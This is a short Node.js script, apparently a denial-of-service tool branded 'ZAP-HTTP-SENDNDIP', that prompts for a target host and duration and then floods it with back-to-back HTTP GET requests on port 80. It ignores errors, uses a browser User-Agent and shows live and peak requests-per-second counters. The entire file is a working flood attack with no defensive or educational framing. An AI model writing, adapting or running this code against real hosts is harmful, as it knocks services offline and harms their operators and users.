const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const prompt = (q) => new Promise(res => rl.question(q, res));
const clear = () => process.stdout.write('\x1Bc');

let totalRequests = 0;
let lastRequests = 0;
let maxRPS = 0;
let logger;

async function startFlood() {
    clear();
    console.log("jrl@zap.live >");

    const target = await prompt("[¿T] > ");
    const duration = parseInt(await prompt("[¿DU!] > ")) || 60;
    const end = Date.now() + duration * 1000;

    clear();

    logger = setInterval(() => {
        const rps = totalRequests - lastRequests;
        lastRequests = totalRequests;
        maxRPS = Math.max(maxRPS, rps);

        clear();
        console.log("ZAP-HTTP-SENDNDIP");
        console.log(`Requests:      ${totalRequests}`);
        console.log(`Reqs/sec:      ${rps}`);
        console.log(`Max Req/sec:   ${maxRPS}`);
    }, Math.floor(Math.random() * 2000) + 3000);

    function sendRequest() {
        if (Date.now() > end) return stop();

        const options = {
            host: target,
            port: 80,
            path: "/",
            method: "GET",
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': '*/*',
                'Connection': 'close'
            }
        };

        const req = http.request(options);
        req.on('error', () => {});
        req.end();

        totalRequests++;
        setImmediate(sendRequest);
    }

    sendRequest();
}

function stop() {
    clearInterval(logger);
    clear();
    console.log("ZAP-HTTP-SENDNDIP DONE");
    console.log(`Total Requests: ${totalRequests}`);
    console.log(`Max Req/sec:    ${maxRPS}`);
    process.exit(0);
}

startFlood();
